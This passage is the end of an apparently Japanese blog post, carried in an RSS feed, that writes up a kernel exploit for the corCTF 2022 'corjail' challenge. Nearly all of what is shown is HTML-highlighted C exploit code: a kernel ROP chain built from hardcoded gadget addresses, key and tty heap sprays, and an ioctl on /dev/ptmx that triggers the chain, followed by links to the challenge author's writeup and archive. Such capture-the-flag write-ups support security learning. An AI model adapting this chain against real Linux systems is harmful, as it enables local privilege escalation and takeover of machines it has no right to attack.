&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff810e4fc0&lt;/span>); &lt;span style="color:#75715e">// find_task_by_vpid
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff8117668f&lt;/span>); &lt;span style="color:#75715e">// pop rdx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x6E0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff81029e7d&lt;/span>); &lt;span style="color:#75715e">// add rax, rdx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff817e1d6d&lt;/span>); &lt;span style="color:#75715e">// mov qword [rax], rbx ; pop rbx ; ret ; (1 found)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; &lt;span style="color:#75715e">// trash
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff81c00ef0&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x16&lt;/span>); &lt;span style="color:#75715e">// swapgs_restore_regs_and_return_to_usermode + 0x16
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// mov rdi,rsp; mov rsp,QWORD PTR gs:0x6004; push QWORD PTR [rdi+0x30]; ...
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> (ulong)NIRUGIRI;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> user_cs;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> user_rflags;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> (ulong)krop_stack &lt;span style="color:#f92672">+&lt;/span> KROP_USTACK_SIZE &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> user_ss;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] size: 0x%lx&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, (ulong)rop &lt;span style="color:#f92672">-&lt;/span> (ulong)key_payload);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">assert&lt;/span>((ulong)rop &lt;span style="color:#f92672">-&lt;/span> (ulong)key_payload &lt;span style="color:#f92672">&amp;lt;=&lt;/span> NUM_3RD_KEY_SIZE);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">assert&lt;/span>(&lt;span style="color:#ae81ff">512&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> NUM_3RD_KEY_SIZE &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> NUM_3RD_KEY_SIZE &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">1024&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> NUM_3RD_KEY_SPRAY; &lt;span style="color:#f92672">++&lt;/span>ix) &lt;span style="color:#a6e22e">alloc_key&lt;/span>(key_payload, NUM_3RD_KEY_SIZE &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span>, NULL);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Invoke tty_struct.ops.ioctl
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] ioctl-ing to /dev/ptmx&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> NUM_TTY_SPRAY; &lt;span style="color:#f92672">++&lt;/span>ix) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">ioctl&lt;/span>(tty_fd[ix], &lt;span style="color:#ae81ff">0x1234567890&lt;/span>, &lt;span style="color:#ae81ff">0xABCDE0000&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// end of life (unreachable)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[ ] END of life...&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//sleep(999999);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="参考">参考&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://syst3mfailure.io/corjailhttps://syst3mfailure.io/corjail">Author&amp;rsquo;s writeup&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/Crusaders-of-Rust/corCTF-2022-public-challenge-archive/tree/master/pwn/corjail/task/build">corCTF2022 archive&lt;/a>&lt;/li>
&lt;/ul></description></item></channel></rss>